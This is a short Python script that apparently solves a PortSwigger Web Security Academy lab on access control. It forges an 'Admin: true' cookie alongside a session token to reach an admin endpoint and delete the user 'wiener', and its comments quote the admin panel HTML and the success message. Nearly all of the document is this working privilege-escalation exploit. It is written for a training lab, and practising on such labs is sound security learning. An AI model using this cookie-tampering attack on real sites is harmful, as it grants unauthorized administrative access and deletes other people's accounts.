# Lab: User role controlled by request parameter

import requests

#url = "https://0afe00bb04afd7e380ca49bd00da00d9.web-security-academy.net/admin"
'''
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
'''
url = "https://0afe00bb04afd7e380ca49bd00da00d9.web-security-academy.net/admin/delete?username=wiener"
'''
                    <section>
                        <p>User deleted successfully!</p>
                        <h1>Users</h1>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
'''
cookies ={
    'Admin':'true',
    'session':'rZW0dQVko8z2PSCL56STf8VDCmmltPl4'
}

r = requests.get(url, cookies=cookies)
print(r.text)